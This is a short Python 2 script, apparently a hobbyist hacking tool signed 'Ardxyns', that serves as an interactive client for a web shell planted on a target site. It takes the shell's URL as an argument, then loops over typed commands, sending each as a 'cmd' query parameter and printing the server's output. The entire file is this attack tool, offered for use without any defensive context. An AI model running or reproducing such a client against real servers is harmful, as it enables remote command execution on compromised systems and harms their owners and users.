import time
import requests
import sys
import os
if len(sys.argv) < 2:
	os.system('clear')
	
	print "\n[!] Use: RUN.py https://target.com/shel.php\n"
	sys.exit()

i = sys.argv[1]
print "~ Simple Remote Web Tools "
print " Make With Love ~Ardxyns "
print " ~Exploit To "+i
print ""
time.sleep(3)
while True:
    try:
        c = raw_input("sxc@"+i+":~$ ")
        r = requests.get(i+"?cmd="+c)
        print r.text
    except Exception:
        print "cek url"
        break

